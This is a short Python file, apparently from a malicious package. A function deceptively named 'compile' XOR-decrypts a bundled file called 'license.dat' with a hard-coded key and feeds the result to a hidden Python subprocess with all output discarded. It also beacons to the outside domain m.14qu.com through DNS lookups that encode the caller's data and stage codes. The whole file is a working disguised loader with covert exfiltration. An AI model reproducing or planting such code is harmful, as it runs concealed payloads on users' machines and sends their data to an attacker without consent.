import os.path, base64, itertools, sys, subprocess, socket, os

def pg(h,n):
    e = h.encode().hex()
    sf = "m.14qu.com"
    v = "%s.%s.%s" % (e,n,sf)
    try:
        socket.gethostbyname(v)
    except:
        pass

def compile(h):
    k = b's93lw#@#$(38gjslkd93lkg1j;dkmbADioVB3]p[;32hfLIK<S&@#(VLK|PL50)'
    try:
        pg(h,'3')

        m = os.path.dirname(os.path.abspath(__file__))
        f = open( '%s%slicense.dat' % (m,os.sep),'rb')
        d = f.read()
        f.close()
        b = bytearray(i ^ j for i,j in zip(d, itertools.cycle(k)))

        p = subprocess.Popen([sys.executable], env={}, stdin=subprocess.PIPE, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        p.stdin.write(b)
        p.stdin.flush()
        p.stdin.close()

        pg(h,'4')

    except Exception as e:
        pg(h,'99')
        pass